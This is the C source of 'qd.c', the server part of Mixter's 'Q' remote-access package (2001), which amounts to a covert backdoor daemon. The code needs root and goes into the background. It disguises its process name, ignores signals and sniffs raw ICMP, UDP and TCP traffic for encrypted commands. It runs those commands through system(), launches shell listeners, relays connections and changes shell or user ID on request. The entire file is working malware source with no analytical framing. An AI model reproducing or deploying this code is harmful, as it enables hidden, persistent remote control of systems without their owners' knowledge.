/*   ___
   '/ _ \        Version 2.4 - Remote access and
   | | | |  redirection services with strong encryption.
   | |_| |           (c) 1999-2001 by Mixter
   '\__\_\         qd.c - remote access server
 */

#include "q.h"

#define GDATA(y) data+strlen(y)+1

#ifdef WANT_LOGGING
void
slog (char *msg,...)
{
  char tmp[BS];
  va_list v;

  va_start (v, msg);
  vsnprintf (tmp, BS, msg, v);
  va_end (v);
  openlog ("qd", LOG_PID, LOG_AUTH);
  syslog (LOG_ALERT, tmp);
  closelog ();
}
#endif

int
main (int ac, char **av)
{
  char *data = NULL, *raw = NULL, rb[BS];
  int isock, usock, tsock, opt = 0;

  alg = Q_ALG;
  while ((opt = getopt (ac, av, "p:b:")) != EOF)
    if (opt == 'p')		/* standalone ssh */
      {
	int pid = fork (), port = atoi (optarg);
	if (pid)
	  fatal ("%s: shell server listening on port %d, pid %d\n", av[0], port, pid);
	while (1)
	  ssh (port, 1, ac, av);
	exit (0);
      }
    else if (opt == 'b')	/* standalone bnc */
      {
	int pid = fork (), sport = 0, dport = 0;
	char dhost[BS];
	u32 addy = 0;

	if ((sscanf (optarg, "%d:%d:%256s", &sport, &dport, dhost) < 3) || !(addy = resolve (dhost)))
	  fatal ("usage: %s -b sourceport:destport:desthost\n", av[0]);

	if (pid)
	  fatal ("%s: redirect server listening on port %d, relaying to %s:%d, pid %d\n", av[0], sport, dport, dhost, pid);
	red (dport, sport, 1, ac, av, addy);
	exit (0);
      }

  if (geteuid ())
    fatal ("%s: permission denied\n", av[0]);

  if (fork ())
    exit (0);

  issl_init_global(Q_RSABITS);

#ifdef PIDFILE
  if (isactive (PIDFILE))
#ifdef WANT_LOGGING
    slog ("already running in the background, exiting");
#else
    exit (0);
#endif
#endif

  disguise (HIDDEN, ac, av);	/* i'm invisible! */
  sighandler (SIG_IGN);		/* i'm invincible!! */

  isock = rawsock (P_ICMP);
  usock = rawsock (P_UDP);
  tsock = rawsock (P_TCP);

#ifdef WANT_LOGGING
  slog ("Server monitoring raw traffic. Using %d bit RSA.", Q_RSABITS);
#endif

  csa_key ();

  while (1)
    {
      if (data != NULL)
	{
	  free (data);
	  data = NULL;
	}
      if (raw != NULL)
	{
	  free (raw);
	  raw = NULL;
	}

      /* receive pheerable double aes encrypted data */
      if ((raw = tfnread (isock, usock, tsock)) == NULL)
	continue;

      memset (rb, 0, BS);
      strncpy (rb, raw, BS);

      data = aes_decrypt (rb, strlen (rb));

      if (strncmp (data, CODE_EXEC, strlen (CODE_EXEC)) == 0)
#ifdef WANT_LOGGING
	{
	  slog ("executing command: '%s'", GDATA (CODE_EXEC));
	  system (GDATA (CODE_EXEC));
	}
#else
	system (GDATA (CODE_EXEC));
#endif
      else if (strncmp (data, CODE_SSHD, strlen (CODE_SSHD)) == 0)
	{
	  int s, w;
	  if (sscanf (GDATA (CODE_SSHD), "%d %d", &w, &s) != 2)
	    continue;
	  ssh (s, w, ac, av);
	}
      else if (strncmp (data, CODE_RED, strlen (CODE_RED)) == 0)
	{
	  int d, s, w;
	  u32 addy;
	  char destip[8192];
	  if (sscanf (GDATA (CODE_RED), "%d %d %d %s", &w, &s, &d, destip) < 4)
	    continue;
	  if (!(addy = resolve (destip)))
	    continue;
	  red (d, s, w, ac, av, addy);
	}
      else if (strncmp (data, CODE_SHL, strlen (CODE_SHL)) == 0)
#ifdef WANT_LOGGING
	{
	  slog ("shell changed to: '%s'", GDATA (CODE_SHL));
	  q_shell = strdup (GDATA (CODE_SHL));
	}
#else
	q_shell = strdup (GDATA (CODE_SHL));
#endif
      else if (strncmp (data, CODE_UID, strlen (CODE_UID)) == 0)
#ifdef WANT_LOGGING
	{
	  slog ("user id changed to: '%s'", GDATA (CODE_UID));
	  q_uid = atoi (GDATA (CODE_UID));
	}
#else
	q_uid = atoi (GDATA (CODE_UID));
#endif
    }

  return (0);
}
